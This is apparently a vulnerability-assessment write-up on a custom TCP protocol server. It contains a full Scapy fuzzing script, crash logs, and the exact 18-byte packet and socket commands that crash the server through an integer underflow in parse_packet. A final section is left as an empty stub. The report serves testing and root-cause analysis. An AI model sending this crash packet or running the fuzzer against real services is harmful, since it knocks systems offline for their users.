Approach 	[FUZZING]
Technique	[CRAFTPACKET][WRAPAROUND]
CIA			[AVAILABILITY]
----------------------------------------
	Vulnerabilities
		V12-1. warparound is happened when calculating the payload size in the parse_packet function.
			CWE-248: Uncaught Exception https://cwe.mitre.org/data/definitions/248.html
			CWE-191: Integer Underflow (Wrap or Wraparound) https://cwe.mitre.org/data/definitions/191.html

	Compromise Sequence
		1. type the command "python3 fuzz_tartan.py" to fuzz
			$ cat fuzz_tartan.py
			import socket
			import os
			import sys
			import random
			import shutil
			import collections
			from time import sleep
			from scapy.all import *

			head_len = 0
			fuzzed_packet_count = 0

			def get_packet(tf):
				'''
				' tartan message structure
				'
				'   0                   1                   2                   3
				'   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'  |                        preamble (="SB1T")                     |
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'  |    size (whole packet or protocol message) (little endian)    |
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'  |                           timestamp                           |
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'  |      message type (1000, 1002~1007, 9999) (little endian)     |
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'  |                        protocol meesage                       |
				'  |                             ....                              |
				'  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
				'''
				global head_len

				random.seed()
				payload_len = random.randrange(1, 100)
				msgtype = random.randrange(998, 1010).to_bytes(4, 'little')

				# head_length can be valid (=whole packet size) or invalid (= only protocol message size)
				if tf: # fuzz [preamble, length(1~100), timestamp, message type(998~1010), protocol message]
					p = fuzz(Raw(RandBin(size = 4)))/ \
							Raw(load=(payload_len + head_len).to_bytes(4, 'little'))/ \
							fuzz(Raw(RandBin(size = 4)))/ \
							Raw(load=msgtype)/ \
							fuzz(Raw(RandBin(size=payload_len)))
				else: # fuzz [length(1~100), timestamp, message type(998~1010), protocol message]
					p = fuzz(Raw(load="SB1T"))/ \
							Raw(load=(payload_len + head_len).to_bytes(4, 'little'))/ \
							fuzz(Raw(RandBin(size = 4)))/ \
							Raw(load=msgtype)/ \
							fuzz(Raw(RandBin(size=payload_len)))

				return p.copy() # return deep copy of the fuzzed packet

			def test_tcp_fuzz():
				global fuzzed_packet_count
				fuzzed_packets = collections.deque(maxlen=1000) # in order to store the last 1000 fuzzed packets

				try:
					sleep(3)
					s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					s.connect(('192.168.0.228', 50000)) # conenct to the server
					ss = StreamSocket(s)

					while True:
						p = get_packet(random.choice([True, False])) # get a fuzzed packet
						fuzzed_packets.append(p) # keep the fuzzed packet to store it
						fuzzed_packet_count += 1
						print('[pkt_{0:010d}]'.format(fuzzed_packet_count))
						hexdump(p) # print fuzzed packet
						print()
						ss.send(p) # send the fuzzed packet to the server
						sleep(0.05)
				except Exception as err:
					print('error: ', err)

					if err.errno == 111: # found the server crash because the server doesn't open the connection port
						return -1

					if os.path.exists('./fuzz_packet'): # delete path including the fuzzed packets to reproduce the crash.
						shutil.rmtree('./fuzz_packet')

					os.mkdir('./fuzz_packet') # make path to store the fuzzed packets

					# save the last fuzzed packets. name ofrmat is pkt_[10 digit with left padding 0]
					fuzzed_packets.reverse()
					for i in range(len(fuzzed_packets)):
						pkt_num = fuzzed_packet_count - i
						f = open('./fuzz_packet/pkt_' + str(pkt_num).zfill(10), 'wb')
						f.write(bytes(fuzzed_packets[i]))
						f.close()

				finally:
					s.close()

				return 0;

			if __name__ == "__main__":
				if len(sys.argv) == 2:
					head_len = int(sys.argv[1])

				if os.path.exists('./fuzz_packet'): # delete path including the fuzzed packets to reproduce the crash.
					shutil.rmtree('./fuzz_packet')

				while 0 == test_tcp_fuzz(): # do fuzz
					print("fuzz again")

	Analysis
		1. Do fuzz - Random [preamble, length(1~100), timestamp, message type(998~1010), protocol message] field in the message described in the team1's presentation document.
			bkn@DESKTOP-94O1BNS:~/work$ python3 fuzz_tartan.py
			...
			0000  53 42 31 54 02 00 00 00 13 16 EB CA EA 03 00 00  SB1T............
			0010  D4 3D                                            .=

			...
			0000  2B D8 DB 4E 1E 00 00 00 7C B4 39 BF EE 03 00 00  +..N....|.9.....
			0010  6D 09 19 9D 3F 8D C9 41 ED 52 EA 18 BE D1 3F CD  m...?..A.R....?.
			0020  B8 D1 19 E8 0C 21 7B 09 F3 58 C9 4F 16 DE        .....!{..X.O..

			error:  [Errno 104] Connection reset by peer

		2. Connection is terminated by the server. Server logs shows a crash.
			wait for login....
			max packet length=1048576 received=18 packet_length=2 timestamp=3404404243 msgtype=1002
			accumulated packets=18   my_packet_size=2
			bytes=18, data=[SB1T]
			pkt header : length=2  head=[SB1T]
			pkt header : msgtype=1002
			pkt header : timestamp=-890563053
			CBaseProtocol::CBaseProtocol() pmsg=0x0x7f301024d8
			CBaseProtocol::deSerialize()+
			[libprotobuf FATAL google/protobuf/stubs/stringpiece.cc:50] size too big: 18446744073709551602 details: string length exceeds max size
			terminate called after throwing an instance of 'google::protobuf::FatalException'
			  what():  size too big: 18446744073709551602 details: string length exceeds max size
			Aborted

		3. check the generated the fuzzed packets after fuzzing.
			bkn@DESKTOP-94O1BNS:~/work$ ls fuzz_packet/
			...
			pkt_0000000039  pkt_0000000082  pkt_0000000125  pkt_0000000168  pkt_0000000211  pkt_0000000254
			pkt_0000000040  pkt_0000000083  pkt_0000000126  pkt_0000000169  pkt_0000000212
			pkt_0000000041  pkt_0000000084  pkt_0000000127  pkt_0000000170  pkt_0000000213
			pkt_0000000042  pkt_0000000085  pkt_0000000128  pkt_0000000171  pkt_0000000214

		4. Try to find the packet to reproduce the crash with the 'fuzz_verify.py' file. Send the fuzzed packet one by one using the 'enter' key. If you check the server is crashed, finish verify and keep the packet causing the crash.
			bkn@DESKTOP-94O1BNS:~/work$ python3 fuzz_verify.py
			./fuzz_packet/pkt_0000000254
			b'+\xd8\xdbN\x1e\x00\x00\x00|\xb49\xbf\xee\x03\x00\x00m\t\x19\x9d?\x8d\xc9A\xedR\xea\x18\xbe\xd1?\xcd\xb8\xd1\x19\xe8\x0c!{\t\xf3X\xc9O\x16\xde'
			enter to send data above

			...

			./fuzz_packet/pkt_0000000248
			b'SB1T\x02\x00\x00\x00\x13\x16\xeb\xca\xea\x03\x00\x00\xd4='
			enter to send data above
			
		5. We can check the 'pkt_0000000248' cause the crash. So type Ctrl+C to finish "fuzz_verify.py". Do the double confirm the suspicious packet is really reproduce this crash.
			bkn@DESKTOP-94O1BNS:~/work$ python3
			Python 3.8.5 (default, May 27 2021, 13:30:53)
			[GCC 9.3.0] on linux
			Type "help", "copyright", "credits" or "license" for more information.
			>>> import socket
			>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			>>> s.connect(('192.168.0.228', 50000))
			>>> s.sendall(b'SB1T\x02\x00\x00\x00\x13\x16\xeb\xca\xea\x03\x00\x00\xd4=')
			
		6. After sending the packet, the crash is happened. So we find the vulnerable packet.
		7. Analysis the packet
			53 42 31 54 # SB1T 
			02 00 00 00 # size 0x2 // original expectation of this value is 0x02 + 16(header_size). But the fuzzer uses it as the payload size.
			13 16 EB CA # timestamp
			EA 03 00 00 # msg type 0x3ea = 1002
			D4 3D       # payload

		8. Check the source codes. We found the crash is happened in the ParseFromArray function. Because the server shows the "CBaseProtocol::deSerialize()+" logs. The deSerialize function is called by parse_packet function. In the function with our packet, the valud of the variable 'payload_size' is to an extremely large positive number. The value goes into the 'serializedBufferSize' variable and it causes the crash.
			< BaseProtocol.cpp >
			gboolean 
			CBaseProtocol::deSerialize(const unsigned char* serializedBuffer, const int serializedBufferSize)
			{
				printf("CBaseProtocol::deSerialize()+\n");
				return pmsg->ParseFromArray(serializedBuffer, serializedBufferSize); // very large serializedBufferSize is set and it cause the crash.
			}
			
			< ProtocolManager.cpp >
			CBaseProtocol *CProtocolManager::parse_packet(MyPacket *ppkt) {
				CBaseProtocol *cpkt = nullptr;
				size_t payload_size = ppkt->hdr.size - sizeof(MyPacketHeader); // payload_size = (unsigned)2 - (unsigned)16. in the vulnerable packet.
				printf("pkt header : length=%d  head=[%c%c%c%c]\n", ppkt->hdr.size,ppkt->hdr.head[0],ppkt->hdr.head[1],ppkt->hdr.head[2],ppkt->hdr.head[3]);
				if (ppkt->hdr.head[0]=='S' && ppkt->hdr.head[1]=='B' && ppkt->hdr.head[2]=='1' && ppkt->hdr.head[3]=='T' ) 
				{
					printf("pkt header : msgtype=%d\n", ppkt->hdr.msgtype);
					printf("pkt header : timestamp=%d\n", ppkt->hdr.timestamp);
					cpkt=create_protocol_instance((MsgReq)ppkt->hdr.msgtype);
					if (cpkt) cpkt->deSerialize(ppkt->payload, payload_size); // payload_size is too big
				}
				return cpkt;
			}
	
V13)
	Compromise Sequence

	Vulnerabilities
		V13-1.

	Analysis